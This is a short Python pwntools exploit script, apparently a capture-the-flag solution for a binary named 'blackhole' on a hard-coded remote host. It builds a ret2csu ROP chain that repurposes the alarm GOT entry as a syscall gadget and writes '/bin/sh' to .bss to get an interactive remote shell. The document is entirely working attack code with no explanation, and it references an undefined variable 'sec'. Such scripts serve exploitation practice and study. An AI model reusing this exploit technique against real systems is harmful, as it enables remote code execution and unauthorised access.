from pwn import*

p = remote('202.120.7.203',666)
elf = ELF('./blackhole')
#libc= ELF('./libc-2.24.so')


bss = elf.bss()
read_got = elf.got['read']
alarm_got = elf.got['alarm']
main = 0x00000000004009C8
csu_start = 0x400a4a
csu_end = 0x400a30  #mov r13 rdx; r14 rsi;r15 edi 

payload = p64(csu_start) + p64(0) +p64(1) + p64(read_got) + p64(1) + p64(alarm_got) + p64(0)
payload += p64(csu_end) + p64(0) + p64(0) + p64(1) + p64(read_got) + p64(0x3b) + p64(bss)
payload +=p64(0) + p64(csu_end) + p64(0) +p64(0) + p64(1) + p64(bss+8) +p64(0) + p64(0)
payload += p64(bss) +p64(csu_end)

p.sendline("aa")
p.send(payload)
sleep(sec)
p.send(p64(0x85))
content = "/bin/sh\x00"
content += p64(elf.plt['alarm'])
content = content.ljust(0x3b,'A')
p.send(content)
p.interactive()